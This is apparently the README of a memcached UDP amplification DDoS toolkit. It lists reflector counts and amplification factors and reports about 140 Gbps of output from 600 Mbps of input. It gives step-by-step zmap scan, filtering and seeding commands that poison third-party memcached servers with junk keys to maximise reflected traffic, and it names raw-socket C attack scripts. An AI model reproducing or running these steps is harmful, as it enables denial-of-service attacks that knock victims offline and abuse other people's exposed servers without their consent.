# MemcacheD (Active Q3 2020)

## Port: 11211

## Proto: UDP

## Amplification factor: 200x (Q2 2020 - using `memcached-static.c` script)

## Reflector count: ~1,500 (Sept 2020)

## Remediation Progress - 400 less reflectors at Q3 2020 than at Q2 2020

---

Amplification scripts in this folder:

* **memcached-dynamic.c** - Dynamic key reflection query generator C script (raw sockets)
* **memcached-static.c** - Static key reflection template C socket script (raw sockets)

This folder holds all relevant scripts for Memcache amplification (in 2020) utilising either dynamic `<ip> <value>` mg/get/gets command to the effect of garnering the largest amplification factor per IP with the least amount of work (**see memcached-filter.py**); alternatively utilising static gets command to known memcache keys that are pre-seeded from a list file.

Memcache Daemon has thankfully been patched and most old and vulnerable devices have been removed from the internet following the [1.7tbps attack incident back in 2017](https://www.zdnet.com/article/new-world-record-ddos-attack-hits-1-7tbps-days-after-landmark-github-outage/) through efforts of the community at large.

### How does it work

* Using Python to dynamically seed MemcacheD devices that respond to "stats items" query, with bogus data to keys of length 1 that are then used by dynamic or static amplification scripts.
* Either dynamic script (scanned and filtered list of keys) or static script (pre-seeded keys) to generate amplification via raw sockets.

### How to use

1. First use zmap to scan for all reflectors responding to "stats items":

    ```bash
    echo -ne '\x00\x01\x00\x00\x00\x01\x00\x00stats items\r\n' > memcached_probe.pkt
    ```

    ```bash
    zmap -p11211 --output-filter='sport=11211' -Mudp --probe-args=file:memcached_probe.pkt \
        -f "saddr,udp_pkt_size,data" -o ~/memcached.alive.txt
    ```

2. Filter list using this command (this removes bogus responses and cleans up the list):

    ```bash
    cat ~/memcached.alive.txt | sed 's/,/ /g' | sed 's/saddr.*//g' \
    | awk '$3~/53544154/ || $3~/454e44/ || $3~/737461747320/' \
    | awk '{print $1}' | sort -u > memcached.list.txt;wc -l memcached.list.txt
    ```

3. Download the list file `memcached.list.txt` as this will be usable by the C scripts in this folder as well.

4. Run the seeding process:

   * This just uses a junkfile to hold output which is erased at the start if it exists, thus you can paste the entire line in over and over to seed the IPs present in the `memcached.list.txt` file!

    ```bash
    rm junkfile;shuf memcached.list>shufflejunk;mv shufflejunk memcached.list; \
    screen -dmS seeder python3 memecached-seeder.py memcached.list junkfile
    ```

### ~140 Gbps output with 600 Mbps input as at Q2 2020
